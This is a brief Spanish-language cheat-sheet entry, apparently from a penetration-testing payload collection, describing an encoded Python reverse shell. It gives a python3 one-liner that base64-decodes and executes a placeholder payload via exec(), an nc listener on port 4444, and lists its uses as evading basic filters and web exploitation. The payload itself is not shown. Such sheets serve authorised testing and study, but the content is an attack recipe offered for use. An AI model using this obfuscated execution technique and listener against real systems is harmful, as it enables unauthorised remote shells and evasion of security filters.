# Python Reverse Shell — Encoded

## Descripción

Esta variante utiliza codificación para ocultar el payload dentro de una cadena codificada que se decodifica en tiempo de ejecución.

Esto puede utilizarse para evadir filtros simples.

---

# Comando

```bash
python3 -c 'import base64,os;exec(base64.b64decode("PAYLOAD_BASE64"))'
```

---

# Listener

```bash
nc -lvnp 4444
```

---

# Requisitos

* Python
* capacidad de ejecutar código dinámico

---

# Explicación

```
base64.b64decode()     → decodifica payload
exec()                 → ejecuta código resultante
```

---

# Cuándo usarlo

* bypass de filtros básicos
* explotación web
* payloads ofuscados

---

# Limitaciones

* detectable por EDR
* ofuscación básica no evita detecciones avanzadas
